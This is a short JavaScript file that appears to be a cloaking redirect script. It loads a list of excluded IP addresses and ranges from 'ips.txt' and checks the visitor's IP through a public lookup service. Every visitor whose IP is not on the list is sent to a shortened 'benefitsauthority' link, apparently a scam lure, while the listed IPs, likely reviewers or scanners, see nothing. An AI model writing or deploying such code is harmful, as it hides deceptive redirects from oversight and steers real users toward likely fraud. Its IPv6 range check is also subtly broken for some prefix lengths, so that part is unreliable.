function ipv4ToInt(ip) {
    return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet), 0) >>> 0;
}

function ipv4InRange(ip, cidr) {
    const [range, bits] = cidr.split('/');
    const mask = ~((1 << (32 - bits)) - 1);
    return (ipv4ToInt(ip) & mask) === (ipv4ToInt(range) & mask);
}

function ipv6ToBigInt(ip) {
    const fullIp = ip.replace(/::/, () => ':'.repeat(9 - ip.split(':').length)).split(':');
    return BigInt('0x' + fullIp.map(part => part.padStart(4, '0')).join(''));
}

function ipv6InRange(ip, cidr) {
    const [range, bits] = cidr.split('/');
    const mask = BigInt('0x' + 'f'.repeat(bits / 4) + '0'.repeat((128 - bits) / 4));
    return (ipv6ToBigInt(ip) & mask) === (ipv6ToBigInt(range) & mask);
}

function isIPv4(ip) {
    return ip.includes('.') && ip.split('.').length === 4;
}

function isIPv6(ip) {
    return ip.includes(':') && ip.split(':').length > 1;
}

async function loadIPList() {
    try {
        const response = await fetch('ips.txt');
        if (!response.ok) throw new Error();
        return (await response.text()).trim().split('\n');
    } catch {
        return [];
    }
}

function ipExactMatch(ip, range) {
    return ip === range;
}

(async function() {
    try {
        const excludedIPs = await loadIPList();
        const { ip } = await (await fetch('https://api.ipify.org?format=json')).json(); // Change to api.ipify.org for IPv4 and IPv6
        let isExcluded = false;

        excludedIPs.forEach(range => {
            range = range.trim();

            if (range.includes('/')) {
                if (isIPv6(range) && isIPv6(ip)) {
                    if (ipv6InRange(ip, range)) isExcluded = true;
                } else if (isIPv4(range) && isIPv4(ip)) {
                    if (ipv4InRange(ip, range)) isExcluded = true;
                }
            } else {
                if (ipExactMatch(ip, range)) isExcluded = true;
            }
        });

        if (!isExcluded) {
            window.location.href = Math.random() > 0.5 ? 'https://blly.ink/benefitsauthority' : 'https://blly.ink/benefitsauthority';
        }
    } catch (error) {
        console.error(error);
    }
})();
